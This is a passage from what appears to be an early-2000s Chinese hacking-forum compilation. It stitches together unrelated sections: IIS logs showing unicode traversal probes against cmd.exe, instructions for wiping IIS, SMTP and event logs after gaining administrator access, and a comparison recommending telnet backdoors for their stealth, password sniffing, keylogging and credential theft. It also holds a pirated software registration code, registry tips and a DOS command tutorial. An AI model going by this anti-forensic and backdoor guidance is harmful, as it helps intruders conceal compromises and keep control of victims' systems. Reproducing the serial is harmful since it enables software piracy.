01:26:17 127.208.246.13 GET /_vti_bin/..%5c../..%5c../..%5c../winnt/sys tem32/cmd 
.exe 404 
01:26:17 127.74.36.149 GET /_vti_bin/..%5c../..%5c../..%5c../winnt/sys tem32/cmd. 
exe 404 
01:26:17 127.208.246.13 GET /_mem_bin/..%5c../..%5c../..%5c../winnt/sys tem32/cmd 
.exe 404 
01:26:17 127.74.36.149 GET /_mem_bin/..%5c../..%5c../..%5c../winnt/sys tem32/cmd. 
...................... 

shit ,全是CGI漏洞的扫描 

法一:> 这个时侯 net stop w3svc 停掉后台服务. 
然后尽管 del ............ 
看这删吧,不要删的过火,把当天的删了就行. 别忘了再NET START w3svc 把服务打开. 
法二:> 当然你如果还想更好,那就改改日志,可以改了系统时间后再改日志,只把你的清了,别忘了把时间改 
回来哦 
实际上在得到ADMIN权限后,做这些事很容易. 

法三:) 最傻瓜的清FTP日志的方法, cleaniislog 小蓉写的工具. 


(4) SMTP日志 

smtp服务日志默认位置：%sys temroot%\sys tem32\logfiles\smtpsvc1\ 
目录: 

01-06-01 08:12a SMTPSVC1 

该目录下的文件行式: 

01-05-15 12:21a 371 ex010513.log 
01-05-16 03:52a 257 ex010514.log 
01-05-16 09:09a 182 ex010515.log 
01-05-17 04:14p 893 ex010516.log 
01-05-18 09:22a 263 ex010517.log 
01-05-21 09:09a 293 ex010518.log 
01-06-01 08:12a 8,222 ex010531.log 
01-06-05 01:37p 3,099 ex010601.log 

该文件ex010601.log的内容: 

00:58:24 202.104.112.168 QUIT - 0 
00:58:30 202.104.112.168 MAIL FROM - 250 
00:58:30 202.104.112.168 RCPT TO - 250 
00:58:30 202.104.112.168 MAIL FROM - 250 
00:58:30 202.104.112.168 RCPT TO - 250 
00:58:30 202.104.112.168 QUIT - 0 
00:59:51 202.104.112.168 MAIL FROM - 250 
00:59:51 202.104.112.168 RCPT TO - 250 
00:59:54 202.104.112.168 QUIT - 0 
关于LOG文件的含意我就不解释了,浪费时间,嘿嘿. 
删除方法: 

法一:> 此时可以 net stop smtpsvc 
再 del ............. 
别忘了 net start smtpsvc 

当然改文件内容也是可以的喽! 


(5) eventlog日志文件 
它包含: 安全日志 
统日志 
应用程序日志 
题外话: 看看应用程序日志,觉得记录得很详细. 
象这样: 外壳意外停止并且Explorer.exe被重新启动。 
Detection of product ''{00000804-78E1-11D2-B60F-006097C998E7}'', feature ''TCWord2Files'' failed during request for component '''' 
它是关键服务。如果不用第三方工具，在命令行上几乎没有删除安全日志和系统日志的可能,(至少我还没想 
出来)所以还是得用虽然简单但是速度慢得死机的办法：打开“控制面板”的“管理工具”中的 “事件查看器” 
(98没有，知道用Win2k的好处了吧)，在菜单的“操作”项有一个名为“连接到另一台 计算机”的菜单，点击它： 
输入远程计算机的IP，等,然后选择远程计算机的安全性日志，右键选择它的属性,点击属性里的“清除日志” 
按钮，等啊等啊等.......OK！安全日志清除完毕！同样的忍受痛苦去清除系统日志。

【如何更改Terminal Server的端口-3389端口？】
该修改需要在服务器端和客户端同时修改，如果不知道该服务器的端口号，客户端将无法连接服务器。

服务器端的修改：

Key: HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp

Name:PortNumber

Type:DWORD

Valus:任意值

Key: HKLME\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp

Name:PortNumber

Type:DWORD

Value:和上面值一致

注：需重启后生效。

然后我们修改客户端，打开Terminal Server Client的客户端管理器，导出连接文件（后缀名为cns），用记事本打开该cns文件，搜索"Server Port"，修改该值，与服务器保持一致即可（注意进制的转换）。最后导入该cns文件至Terminal Server的客户端管理器。



【如何更改W2K的Telnet端口】
W2K里面有送很多工具包有等大家去发现，tlntadmn.exe就是其中一个，tlntadmn.exe的一个功能就是更改TELNET端口，运行之后界面如下：
D:\WINNT\system32>tlntadmn.exe
Microsoft (R) Windows 2000 (TM) (内部版本号 2195) 
Telnet Server Admin (Build 5.00.99201.1) 
请在下列选项中选择一个: 
0) 退出这个应用程序 
1) 列出当前用户 
2) 结束一个用户的会话 ... 
3) 显示 / 更改注册表设置 ... 
4) 开始服务 
5) 停止服务 

选3回车进入设置，进入如下子界面： 

请在下列选项中选择一个: 
0) 退出这个菜单 
1) AllowTrustedDomain 
2) AltKeyMapping 
3) DefaultDomain 
4) DefaultShell 
5) LoginScript 
6) MaxFailedLogins 
7) NTLM 
8) TelnetPort 
请键入一个选项的号码 [0 - 8] 以选择该选项:

第8项就是更改TELNET端口，以下是我个人的更改信息： 
TelnetPort 的当前值 = 23 
您确实想更改这个值吗 ? [y/n]y 
TelnetPort [ 当前值 = 23; ] :2323 
您确实想将 TelnetPort 设置为 : 2323 [y/n]

当然，你也可以改为别的端口，只要不发生冲突就行了，里面还有很多其它功能，如登陆脚本、最大登陆人数等；完成之后返回上一级，先停止再启动，更改成功，里面还有很多别的功能，自己慢慢去发现吧！ 



【如何禁止匿名用户连接你的IPC$共享？】
我们可以通过修改注册表来实现

Key:HKLM\SYSTEM\CurrentControlSet\Control\Lsa

Name: RestrictAnonymous

Type: REG_DWORD

Value: 1 | 2

说明：把该值设为1时，匿名用户无法列举主机用户列表；

把该值设为2时，匿名用户无法连接你的IPS$共享，不建议使用2，否则可能会造成你的一些服务无法启动，如SQL Server...



【学校网络中心】
你好！
你的系统账号kl 没有密码，建议你加个密码！最近学校里面的电脑硬盘很多都被格式化了！

                                     学校网络中心 192.1 留

【对国内流行的三大telnet扩展后门程序的比较】
现在流行的telnet扩展后门主要有三个：winshell、wollf、wineggdropshell 三个后门都是以w开头，不知道是不是巧合。以下我会详细对这三个后门作功能、大小、稳定性、优缺点、安全上的比较。 

winshell最新版本是5.0，应该是不会有再新的版本的了。 
wollf最新版本是1.6，很久都没有升级过了，很有可能不再有新的版本。 
wineggdropshell最新是matrix版本，作者自1.40版本后升级时间加长了，不过还是会定期为后门加入些有用的新功能。 

三个后门作者： 
winshell作者是孤独剑客(jacker)，主要代表作就是winshell，也没有其它免费的作品了。 
wollf作者是wollf，主要代表作是wollf。 
wineggdropshell作者是wineggdrop，另有网名Hotmail，代表作是这个后门，还有写过很多小工具，属于多产，小工具最大特点是小型，小工具一般大小都是介于3k到8k之内，他写的20多个小工具，加上这个后门，可以完全装在一个软盘上。 

大小方面比较： 
winshell：服务端压缩后只是6k，最小型的一个。 
wollf：服务端压缩后是56k，属于不算大。 
wineggdropshell：最新版本是58k。 

wollf和wineggdropshell在大小上相差无几，不过wineggdropshell在隐藏性方面比wollf优胜很多，因为是插入到其它进程中运行的，在进程中是看不到wineggdropshell后门本身进程的。 

功能： 
三个后门都是以服务启动，都支持多用户同时连接 
winshell：基本上没有什么大的功能，只提供下载，得到一个cmd的shell和关闭，重启几个功能。 

wollf：功能不算太多，因为大多数功能根本弄同虚设，例如删除件，复制文件，改文件名，显示目录等一类的功能，根本可以在得到一个cmd的shell后自己去操作。基本有用的功能是查看和杀进程，通过ftp或http下载，嗅探密码，打开ftp服务以及键盘记录这几个功能。 

wineggdropshell：功能最多的一个后门，有很多功能是在telnet后门中首先出现的。关于那些功能，会在后面加以说明。 

稳定性： 
基本上都是一样稳定。 

安全性： 
winshell：配置信息放在文件中，加过密的，很安全。 
wollf：配置信息放在文件尾，全是明文的，连密码也是明文的，极不安全，人家得到服务器就能知道连接密码。 
wineggdropshell：配置信息放在文件尾，密码是md5加密的，因为md5本身的特性，所以就算得到服务器程序，一样无法得到密码。 

优点： 
winshell：小型是winshell的最大优点。 

wollf：具有反向连接是wollf比较突出的一个优点。 

wineggdropshell：丰富的功能，比较高的隐藏性和丰富的在线帮助是wineggdropshell的最大优点 

缺点： 
winshell：功能太少了，而且命令是可以用一个字符的，很容易就误输入了个d，然后系统就关机了。 

wollf：很多功能都做得不太好，我稍微列举一下某些功能的问题。 
1.连接后输入密码失败，不会断开，一样连接，很容易使用穷举密码的方法去破出密码来。 
2.键盘记录并不是实时将击键记录，是要收到一定数量的击键后才会记录，如果用户只是输入几个字符后就不再输入任何东西，只是使用鼠标的话，根本不知道用户的击键。 
3.ftp服务并不是做得太好，因为不支持断点再传。 
4.用户没有配置过服务器的密码的话，默认居然是空密码，极不安全。 
5.嗅探密码功能无法配置嗅探内网还是外网，很容易就只是嗅探内网的网卡的连接，根本什么都得不到。 
6.配置信息全是明文，极不安全。 

wineggdropshell：功能丰富是优点，但同时也是缺点，因为很多功能并不是一般新手可以使用到的，这后门一般不适合于新手使用。而且升级比较困难，因为是插入到其它进程的。 

功能大比拼： 
由于winshell基本上没有什么功能，所以这里只能比较wollf和wineggdropshell 
wollf和winshelldropshell都具有的功能 
1.cmd的Shell 
都写得很好，输入和输出都没有显示错误的字符，相当的稳定。 

2.http下载 
wollf的http下载不支持断点再传，wineggdropshell的支持。wollf只支持标准的http服务，就是http服务打开的端口一定是要80端口，如果是其它端口的话，无法下载。wineggdropshell对于非80端口的http服务一样支持。 

3.ftp上传和下载 
wollf支持ftp上传和下载，不过你本身一定要知道文件在ftp服务器的什么目录以及要知道文件名字。上传和下载都不支持断点再传. 
wineggdropshell提供一个ftp console功能，这个功能特别在于控制ftp的操作象在dos一样简单，支持ftp的基本功能，可以上传，下载，建目录，删除文件，将文件改名和发送ftp命令.上传下载都支持断点再传，这功能可以归纳为一个简单的FTP客户端功能。 

4.查看和杀进程 
基本上两个后门都是一样，不过wollf杀进程只能杀某个PID的进程，不支持进程名。wineggdropshell杀进程支持杀某个PID或进程名。 

5.嗅探密码功能 
wollf因为不支持用户自配置网卡号，嗅探多内网的系统多会失败，而且记录看起来比较乱。 
wineggdropshell支持自配置嗅探的网卡号，嗅探的记录很整齐。 

6.查看系统信息功能 
wollf列出的信息太过模糊，系统全是NT/2000，不够wineggdropshell的详细。 

7.关机，重启功 
基本上是一样 

8.端口转发功能 
基本上一样，wollf的只支持单进程转发，wineggdrosphell支持多进程转发。 

9.内建telnet功能 
wollf支持，wineggdropshell没有 

10.ftpd功能(ftp 服务) 
wollf支持，wineggdropshell暂时没有.wollf的ftp服务不支持断点再传功能 

11.键盘记录功能 
wollf支持，不过不是太好用。插入进程版的wineggdropshell没有键盘记录功能。 

12.注册表管理功能 
wineggdropshell独有功能，一个dos类的控制平台，有基本的注册表操作。 

13.系统服务管理功能 
wineggdrosphell独有功能，支持查看某个服务状态，配置某个服务启动参数，停止服务，启动服务，删除服务等。 

14.端口到程序关联功能 
wineggdropshell独有功能，相当于fport.exe的功能 

15.安装终端功能 
wineggdropshell独有功能，在win 2k 服务版上，并没有安装终端的系统上安装终端，不需要上传任何文件，一个命令再重启系统就搞定。 

16.克隆帐号功能 
wineggdropshell独有功能，相当于小榕的ca.exe 

17.httpd(http服务功能) 
wineggdropshell独有功能，在远程系统打开一个http服务，支持多线程，打开这服务后，可以用IE随意查看远程系统的文件列表和下载文件。 

18.findpass功能 
wineggdropshell独有功能，功能是以NT 4.0或2k系统中得到所有登陆了系统的用户的密码，一个加强版本的findpass，可以得到克隆帐户的密码，在原版的findpass无法得到密码的情况中，这个功能都可以得到密码。 

19.tcp/ip filtering功能(端口过滤功能) 
wineggdropshell独有功能，网上只看过一个叫ipf的程序可以有同样的功能，但后门中这个功能比ipf更为先进和准确。 

20.sock5代理功能 
wineggdropshell独有功能，可以在将远程系统做成一个具有无密码验证或有密码验证的sock5代理，可以限制连接的IP。相当于skserver，不过不提供代理串联和数据加密. 

21.还有其它删除日志，恢复系统常用关联，查看本地或远程系统帐户SID，列举系统所有IP，多用户连入时互相发信息聊天等功能 
wineggdropshell独有功能 

22.在线帮助 
wollf也有在线帮助功能，不过不够详细，只提供功能用法，不带例子.wineggdropshell在线帮助提供用法并带有例子。 

23.反向连接功能 
wollf独有功能。 

总结： 
三个后门各自有自己本身的特别。如果喜欢小型后门的朋友，winshell就是首选。如果喜欢功能丰富的朋友，wineggdropshell绝对是首选，在功能上wineggdropshell和wollf比较的话，是具有压倒性的优势的，而且很多功能比wollf的功能要实用很多。如果想有键盘记录或者打开ftp服务功能的话，可以使用一下wollf。telnet后门还有很多，例如srv.exe，tini.exe，tcmd，remotenc等等，但那些因为有的没有验证密码或者功能只是一个cmd的shell，基本上和系统本身的telnet服务差不多，根本上不算是telnet扩展后门，所以不加以比较。


【局域网查看工具 1】
局域网查看工具 1.60 注册版

局域网查看工具（LanSee）是一款主要用于对局域网(Internet上也适用)上的各种信息进行查看的工具。采用多线程技术，搜索速度很快。它将局域网上比较实用的功能完美地融合在一起,比如搜索计算机（包括计算机名，IP地址，MAC地址，所在工作组，用户），搜索共享资源，搜索共享文件，多线程复制文件（支持断点传输），发短消息，高速端口扫描，捕获指定计算机上的数据包,查看本地计算机上活动的端口,远程重启/关闭计算机等,功能十分强大。该软件是一款绿色软件,解压后直接打开运行，无需安装。

注册信息：

注册名：OkGet
注册码：O1279W97MWCE
M1349697N1EK

【屏蔽或指定“控制面板”中的指定项目】
屏蔽“控制面板”中的指定项目

屏蔽掉“控制面板”中的某些项目，以防止用户进行任意设置。新建一个双字节(REG＿DWORD)值项HKEY＿CURRENT＿USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼ Explorer＼DisallowCpl,修改其值为1。然后新建一个注册表项HKEY＿CURRENT＿USER＼Software＼Microsoft＼Windows＼CurrentVersion＼Policies＼Explorer＼ DisallowCpl，在该项下新建若干个字符串(REG＿SZ)值项，形式为“序号＝控制面板项对应的文件名”。如想屏蔽控制面板中的“显示”和“系统”两项，可以在该项下新建两个值项“1”和“2”，值分别为“desk.cpl”(显示项对应的文件)和sysdm.cpl(系统项对应的文件)。重启桌面使更改生效。


14．指定“控制面板”中显示的项目
在“控制面板”中只显示指定的项目，对于没有指定的项目则不显示。新建一个双字节(REG＿DWORD)类型的值项HKEY＿CURRENT＿USER＼Software＼ Microsoft＼Windows＼Current Version＼Policies＼Explore＼RestrictCpl，修改其值为1，然后新建一个注册表项HKEY＿CURRENT＿USER＼Software＼ Microsoft＼Windows＼Current Version＼Policies＼ Explore＼RestrictCpl，在该项下新建若干个字符串(REG＿SZ)值项，形式为“序号＝控制面板项对应的文件名”。如只允许用户使用控制面板中的“显示”和“系统”两项，可以在该项下新建两个值项“1”和“2”，值分别为“desk.cpl”和sysdm.cpl。重启桌面使更改生效。
注意：使用“屏蔽控制面板中的指定项目”和“指定控制面板中显示的项目”都可以定制控制面板中项目的显示，但是这两个方法有可能发生冲突。如果发生冲突，则“屏蔽控制面板中的指定项目”方法优先。



【常用DOS命令】
常用DOS命令
atty.126.com  2003-10-30  网络休闲庄会员俱乐部


一）MD――建立子目录 

1．功能：创建新的子目录

2．类型：内部命令

3．格式：MD[盘符：][路径名]〈子目录名〉

4．使用说明：

（1）“盘符”：指定要建立子目录的磁盘驱动器字母，若省略，则为当前驱动器；

（2）“路径名”：要建立的子目录的上级目录名，若缺省则建在当前目录下。

例：（1）在C盘的根目录下创建名为FOX的子目录；（2）在FOX子目录下再创建USER子目录。

C：、＞MD FOX （在当前驱动器C盘下创建子目录FOX）

C：、＞MD FOX 、USER （在FOX 子目录下再创建USER子目录）

（二）CD――改变当前目录

1．功能：显示当前目录

2．类型：内部命令

3．格式：CD[盘符：][路径名][子目录名]

4．使用说明：

（1）如果省略路径和子目录名则显示当前目录；

（2）如采用“CD、”格式，则退回到根目录；

（3）如采用“CD.。”格式则退回到上一级目录。

例：（1）进入到USER子目录；（2）从USER子目录退回到子目录；（3）返回到根目录。

C:、＞CD FOX 、USER（进入FOX子目录下的USER子目录）

C:、FOX、USER＞CD.。 （退回上一级根目录）

C：、FOX＞CD、 （返回到根目录）

C：、＞

（三）RD――删除子目录命令

1．功能：从指定的磁盘删除了目录。

2．类型：内部命令

3．格式：RD[盘符：][路径名][子目录名]

4．使用说明：

（1）子目录在删除前必须是空的，也就是说需要先进入该子目录，使用DEL（删除文件的命令）将其子目录下的文件删空，然后再退回到上一级目录，用RD命令删除该了目录本身；


（2）不能删除根目录和当前目录。

例：要求把C盘FOX子目录下的USER子目录删除，操作如下：

第一步：先将USER子目录下的文件删空；

C、＞DEL C：、FOX、USER、*。*

第二步，删除USER子目录。

C、＞RD Ｃ：、FOX、USER

（四）DIR――显示磁盘目录命令

1．功能：显示磁盘目录的内容。

2．类型：内部命令

3．格式：DIR [盘符][路径][/P][/W]

4． 使用说明：/P的使用；当欲查看的目录太多，无法在一屏显示完屏幕会一直往上卷，不容易看清，加上/P参数后，屏幕上会分面一次显示23行的文件信息，然后暂停，并提示；Press any key to continue

/W的使用：加上/W只显示文件名，至于文件大小及建立的日期和时间则都省略。加上参数后，每行可以显示五个文件名。


PATH――路径设置命令

1．功能：设备可执行文件的搜索路径，只对文件有效。

2．类型：内部命令

3．格式：PATH[盘符1]目录[路径名1]{[；盘符2：]，〈目录路径名2〉…}

4．使用说明：

（1）当运行一个可执行文件时，DOS会先在当前目录中搜索该文件，若找到则运行之；若找不到该文件，则根据PATH命令所设置的路径，顺序逐条地到目录中搜索该文件；

（2）PATH命令中的路径，若有两条以上，各路径之间以一个分号“；”隔开；

（3）PATH命令有三种使用方法：

PATH[盘符1：][路径1][盘符2：][路径2]…（设定可执行文件的搜索路径）

PATH：（取消所有路径）

PATH：（显示目前所设的路径）

（六）TREE――显示磁盘目录结构命令

1．功能：显示指定驱动器上所有目录路径和这些目录下的所有文件名。

2．类型：外部命令

3．格式：TREE[盘符：][/F][》PRN]

4．使用说明：

（1）使用/F参数时显示所有目录及目录下的所有文件，省略时，只显示目录，不显示目录下的文件；

（2）选用＞PRN参数时，则把所列目录及目录中的文件名打印输出。

（七）DELTREE――删除整个目录命令

1．功能：将整个目录及其下属子目录和文件删除。

2．类型：外部命令

3．格式：DELTREE[盘符：]〈路径名〉

4．使用说明：该命令可以一步就将目录及其下的所有文件、子目录、更下层的子目录一并删除，而且不管文件的属性为隐藏、系统或只读，只要该文件位于删除的目录之下，DELTREE都一视同仁，照删不误。使用时务必小心！！！

五、磁盘操作类命令


（一）FORMAT――磁盘格式化命令

1．功能：对磁盘进行格式化，划分磁道和扇区；同时检查出整个磁盘上有无带缺陷的磁道，对坏道加注标记；建立目录区和文件分配表，使磁盘作好接收DOS的准备。

2．类型：外部命令

3．格式：FORMAT〈盘符：〉[/S][/4][/Q]

4．使用说明：

（1）命令后的盘符不可缺省，若对硬盘进行格式化，则会如下列提示：WARNING:ALL DATA ON NON ――REMOVABLE DISK

DRIVE C:WILL BE LOST ！

Proceed with Format (Y/N)？

（警告：所有数据在C盘上，将会丢失，确实要继续格式化吗？）

（2）若是对软盘进行格式化，则会如下提示：Insert mew diskette for drive A;

and press ENTER when ready…

（在A驱中插入新盘，准备好后按回车键）。

（3）选用[/S]参数，将把DOS系统文件IO.SYS 、MSDOS.SYS及COMMAND.COM复制到磁盘上，使该磁盘可以做为DOS启动盘。若不选用/S参数，则格式化后的磙盘只能读写信息，而不能做为启动盘；

（4）选用[/4]参数，在1.2MB的高密度软驱中格式化360KB的低密度盘；

（5）选用[/Q]参数，快速格式化，这个参数并不会重新划分磁盘的磁道貌岸然和扇区，只能将磁盘根目录、文件分配表以及引导扇区清成空白，因此，格式化的速度较快。

（6）选用[/U]参数，表示无条件格式化，即破坏原来磁盘上所有数据。不加/U，则为安全格式化，这时先建立一个镜象文件保存原来的FAT表和根目录，必要时可用UNFORRMAT恢复原来的数据。

（二）UNFORMAT恢复格式化命令

1．功能：对进行过格式化误操作丢失数据的磁盘进行恢复。


2．类型：外部命令

3．格式：UNFORMAT〈盘符〉[/L][/U][/P][/TEST]

4．使用说明：用于将被“非破坏性”格式化的磁盘恢复。根目录下被删除的文件或子目录及磁盘的系统扇区（包括FAT、根目录、BOOT扇区及硬盘分区表）受损时，也可以用UNFORMAT来抢救。

（1）选用/L参数列出找到的子目录名称、文件名称、大孝日期等信息，但不会真的做FORMAT工作。

（2）选用/P参数将显示于屏幕的报告（包含/L参数所产生的信息）同时也送到打印机。运行时屏幕会显示：“Print out will be sent to LPT1”

（3）选用/TEST参数只做模拟试验（TEST）不做真正的写入动作。使用此参数屏幕会显示：“Simulation only”

（4）选用/U参数不使用MIRROR映像文件的数据，直接根据磁盘现状进行UNFORMAT。

（5）选用/PSRTN；修复硬盘分区表。

若在盘符之后加上/P、/L、/TEST之一，都相当于使用了/U参数，UNFORMAT会“假设”此时磁盘没有MIRROR映像文件。

注意：UNFORMAT对于刚FORMAT的磁盘，可以完全恢复，但FORMAT后若做了其它数据的写入，则UNFORMAT就不能完整的救回数据了。UNFORMAT并非是万能的，由于使用UNFORMAT会重建FAT与根目录，所以它也具有较高的危险性，操作不当可能会扩大损失，如果仅误删了几个文件或子目录，只需要利用UNDELETE就够了。
三） CHKDSK――检查磁盘当前状态命令

1．功能：显示磁盘状态、内存状态和指定路径下指定文件的不连续数目。

2．类型：外部命令

3．格式：CHKDSK [盘符：][路径][文件名][/F][/V]

4．使用说明：

（1）选用[文件名]参数，则显示该文件占用磁盘的情况；

（2）选[/F]参数，纠正在指定磁盘上发现的逻辑错误；

（3）选用[/V]参数，显示盘上的所有文件和路径。

（四）DISKCOPY――整盘复制命令

1．功能：复制格式和内容完全相同的软盘。

2．类型：外部命令

3．格式：DISKCOPY[盘符1：][盘符2：]

4．使用说明：

（1）如果目标软盘没有格式化，则复制时系统自动选进行格式化。

（2）如果目标软盘上原有文件，则复制后将全部丢失。

（3）如果是单驱动器复制，系统会提示适时更换源盘和目标盘，请操作时注意分清源盘和目标盘。

（五）LABEL――建立磁盘卷标命令

1．功能：建立、更改、删除磁盘卷标。

2．类型：外部命令

3．格式：LABEL[盘符：][卷标名]

4．使用说明：

（1）卷标名为要建立的卷标名，若缺省此参数，则系统提示键入卷标名或询问是否删除原有的卷标名；

（2）卷标名由1至11个字符组成。

（六）VOL――显示磁盘卷标命令

1．功能：查看磁盘卷标号。

2．类型：内部命令

3．格式：VOL[盘符：]

4．使用说明：省略盘符，显示当前驱动器卷标。

（七）SCANDISK――检测、修复磁盘命令

1．功能：检测磁盘的FAT表、目录结构、文件系统等是否有问题，并可将检测出的问题加以修复。

2．类型：外部命令


3．格式：SCANDISK[盘符1：]{[盘符2：]…}[/ALL]

4．使用说明：

（1）CCANDISK适用于硬盘和软盘，可以一次指定多个磁盘或选用[/ALL]参数指定所有的磁盘；

（2）可自动检测出磁盘中所发生的交叉连接、丢失簇和目录结构等逻辑上的错误，并加以修复。

（八）DEFRAG――重整磁盘命令

1．。功能：整理磁盘，消除磁盘碎块。

2．类型：外部命令

3．格式：DEFRAG[盘符：][/F]

4．使用说明：选用/F参数，将文件中存在盘上的碎片消除，并调整磁盘文件的安排，确保文件之间毫无空隙。从而加快读盘速度和节省磁盘空间。

（九）SYS――系统复制命令

1．功能：将当前驱动器上的DOS系统文件IO.SYS,MSDOS.SYS和COMMAND.COM 传送到指定的驱动器上。

2．类型：外部命令

3．格式：SYS[盘符：]

*使用说明：如果磁盘剩余空间不足以存放系统文件，则提示：No roomfor on destination disk.


文件操作类命令

（一） COPY文件复制命令

1．功能：拷贝一个或多个文件到指定盘上。

2．类型：内部命令

3．格式：COPY [源盘][路径]〈源文件名〉[目标盘][路径][目标文件名]

4．使用说明：

（1）COPY是文件对文件的方式复制数据，复制前目标盘必须已经格式化；

（2）复制过程中，目标盘上相同文件名称的旧文件会被源文件取代；

（3）复制文件时，必须先确定目标般有足够的空间，否则会出现；insufficient的错误信息，提示磁盘空间不够；

（4）文件名中允许使用通配举“*”“？”，可同时复制多个文件；

（5）COPY命令中源文件名必须指出，不可以省略。

（6）复制时，目标文件名可以与源文件名相同，称作“同名拷贝”此时目标文件名可以省略；

（7）复制时，目标文件名也可以与源文件名不相同，称作“异名拷贝”，此时，目标文件名不能省略；

（8）复制时，还可以将几个文件合并为一个文件，称为“合并拷贝”，格式如下：COPY；[源盘][路径]〈源文件名1〉〈源文件名2〉…[目标盘][路径]〈目标文件名〉；

（9）利用COPY命令，还可以从键盘上输入数据建立文件，格式如下：COPY CON [盘符：][路径]〈文件名〉；

（10）注意：COPY命令的使用格式，源文件名与目标文件名之间必须有空格！

（二）XCOPY――目录复制命令

1．功能：复制指定的目录和目录下的所有文件连同目录结构。

2．类型：外部命令

3．格式：XCOPY [源盘：]〈源路径名〉[目标盘符：][目标路径名][/S][/V][/E]

4．使用说明：


（1）XCOPY是COPY的扩展，可以把指定的目录连文件和目录结构一并拷贝，但不能拷贝隐藏文件和系统文件；

（2）使用时源盘符、源目标路径名、源文件名至少指定一个；

（3）选用/S时对源目录下及其子目录下的所有文件进行COPY。除非指定/E参数，否则/S不会拷贝空目录，若不指定/S参数，则XCOPY只拷贝源目录本身的文件，而不涉及其下的子目录；

（4）选用/V参数时，对的拷贝的扇区都进行较验，但速度会降低。

（三）TYPE――显示文件内容命令

1．功能：显示ASCII码文件的内容。

2．类型：内部命令。

3．格式：TYPE[盘符：][路径]〈文件名〉

4．使用说明：

（1）显示由ASCII码组成的文本文件，对。EXE.COM等为扩展名的文件，其显示的内容是无法阅读的，没有实际意义2；

（2）该命令一次只可以显示一个文件的内容，不能使用通配符；

（3）如果文件有扩展名，则必须将扩展名写上；

（4）当文件较长，一屏显示不下时，可以按以下格式显示；TYPE[盘符：][路径]〈文件名〉|MORE，MORE为分屏显示命令，使用些参数后当满屏时会暂停，按任意键会继续显示。

（5）若需将文件内容打印出来，可用如下格式：

TYPE[盘符：][路径]〈文件名〉，＞PRN

此时，打印机应处于联机状态。

（四） REN――文件改名命令

1．功能：更改文件名称

2．类型：内部命令

3．格式：REN[盘符：][路径]〈旧文件名〉〈新文件名〉

4．使用说明：

（1）新文件名前不可以加上盘符和路径，因为该命令只能对同一盘上的文件更换文件名；

（2）允许使用通配符更改一组文件名或扩展名。

（五）FC――文件比较命令

1．功能：比较文件的异同，并列出差异处。


2．类型：外部命令

3．格式：FC[盘符：][路径名]〈文件名〉[盘符：][路径名][文件名][/A][/B][/C][/N]

4．使用说明：

（1）选用/A参数，为ASCII码比较模式；

（2）选用/B参数，为二进制比较模式；

（3）选用/C参数，将大小写字符看成是相同的字符。

（4）选用/N参数，在ASCII码比较方式下，显示相异处的行号。

（六）ATTRIB――修改文件属性命令

1．功能：修改指定文件的属性。（文件属性参见2.5.4（二）文件属性一节）

2．类型：外部命令。

3．格式：ATTRIB[文件名][R][――R][A][――A][H][――H][S][――S][/S]

4．使用说明：

（1）选用R参数，将指定文件设为只读属性，使得该文件只能读取，无法写入数据或删除；选用――R参数，去除只读属性；

（2）选用A参数，将文件设置为档案属性；选用――A参数，去除档案属性；

（3）选用H参数，将文件调协为隐含属性；选用――H参数，去隐含属性；

（4）选用S参数，将文件设置为系统属性；选用――S参数，去除系统属性；

（5）选用/S参数，对当前目录下的所有子目录及作设置。


七） DEL――删除文件命令

1．功能：删除指定的文件。

2．类型：内部命令

3．格式：DEL[盘符：][路径]〈文件名〉[/P]

4．使用说明：

（1）选用/P参数，系统在删除前询问是否真要删除该文件，若不使用这个参数，则自动删除；

（2）该命令不能删除属性为隐含或只读的文件；

（3）在文件名称中可以使用通配符；

（4）若要删除磁盘上的所有文件（DEL*・*或DEL・），则会提示：(Arey ou sure？）（你确定吗？）若回答Y，则进行删除，回答N，则取消此次删除作业。

（八） UNDELETE――恢复删除命令

1．功能：恢复被误删除命令

2．类型：外部命令。

3．格式：UNDELETE[盘符：][路径名]〈文件名〉[/DOS]/LIST][/ALL]

4．使用说明：使用UNDELETE可以使用“*”和“？”通配符。

（1）选用/DOS参数根据目录里残留的记录来恢复文件。由于文件被删除时，目录所记载斩文件名第一个字符会被改为E5，DOS即依据文件开头的E5和其后续的字符来找到欲恢复的文件，所以，UNDELETE会要求用户输入一个字符，以便将文件名字补齐。但此字符不必和原来的一样，只需符合DOS的文件名规则即可。

（2）选用/LIST只“列出”符合指定条件的文件而不做恢复，所以对磁盘内容完全不会有影响。

（3）选用/ALL自动将可完全恢复的文件完全恢复，而不一一地询问用户，使用此参数时，若UNDELTE利用目录里残留的记录来将文件恢复，则会自动选一个字符将文件名补齐，并且使其不与现存文件名相同，选用字符的优选顺序为：#%――0000123456789A~Z。


UNDELETE还具有建立文件的防护措施的功能，已超出本课程授课范围，请读者在使用些功能时查阅有关DOS手册。

七、其它命令

（一）CLS――清屏幕命令

1功能：清除屏幕上的所有显示，光标置于屏幕左上角。

2类型：内部命令

3格式：CLS

（二） VER查看系统版本号命令

1功能：显示当前系统版本号

2类型：内部命令

3格式：VER

（三） DATA日期设置命令

1功能：设置或显示系统日期。

2类型：内部命令

3格式：DATE[mm――dd――yy]

4使用说明：

（1）省略[mm――dd――yy]显示系统日期并提示输入新的日期，不修改则可直接按回车键，[mm――dd――yy]为“月月――日日――年年”格式；

（2）当机器开始启动时，有自动处理文件（AUTOEXEC.BAT）被执行，则系统不提示输入系统日期。否则，提示输入新日期和时间。

（四） TIME系统时钟设置命令

1功能：设置或显示系统时期。

2类型：内部命令

3格式：TIME[hh：mm：ss：xx]

4使用说明：

（1）省略[hh：mm：ss：xx]，显示系统时间并提示输入新的时间，不修改则可直接按回车键，[hh：mm：ss：xx]为“小时：分钟：秒：百分之几秒”格式；

（2）当机器开始启动时，有自动处理文件（AUTOEXEC.BAT）被执行，则系统不提示输入系统日期。否则，提示输入新日期和时间。

（五）MEM查看当前内存状况命令

1功能：显示当前内存使用的情况

2类型：外部命令

3格式：MEM[/C][/F][/M][/P]

4使用说明：

（1）选用/C参数列出装入常规内存和CMB的各文件的长度，同时也显示内存空间的使用状况和最大的可用空间；

（2）选用/F参数分别列出当前常规内存剩余的字节大小和UMB可用的区域及大小；


（3）选用/M参数显示该模块使用内存地地址、大小及模块性质；

（4）选用/P参数指定当输出超过一屏时，暂停供用户查看。

（六） MSD显示系统信息命令

1功能：显示系统的硬件和操作系统的状况。

2类型：外部命令

3格式：MSD[/I][/B][/S]

4使用说明：

